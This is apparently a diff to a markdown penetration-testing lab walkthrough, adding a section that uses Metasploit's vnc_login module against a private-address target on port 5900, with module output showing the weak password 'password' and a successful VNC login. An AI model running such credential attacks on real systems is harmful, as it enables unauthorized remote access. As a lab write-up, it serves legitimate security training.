@@ -106,3 +106,33 @@ Lets Exploit....
 
 ![ssh shell exploited](screenshots/ssh_2.png)
 
+### Exploiting VNC Server
+
+VNC Server is running on port 5900
+VNC is remote desktop service through which we can get the remote access of the system
+
+Let's use `auxiliary/scanner/vnc/vnc_login` module and try to exploit it
+
+here I need to set only one option for this module:
+
+```bash
+set rhost 192.168.100.8 # target ip addr
+```
+
+```bash
+
+msf6 auxiliary(scanner/vnc/vnc_login) > exploit
+[*] 192.168.100.8:5900    - 192.168.100.8:5900 - Starting VNC login sweep
+[!] 192.168.100.8:5900    - No active DB -- Credential data will not be saved!
+[+] 192.168.100.8:5900    - 192.168.100.8:5900 - Login Successful: :password
+[*] 192.168.100.8:5900    - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/vnc/vnc_login) > 
+
+```
+
+Here we got the password value that is `password`, lets try logging in VNC 
+
+![VNC Connected](screenshots/vnc.png)
+
+Here the credentials worked and we got the VNC access
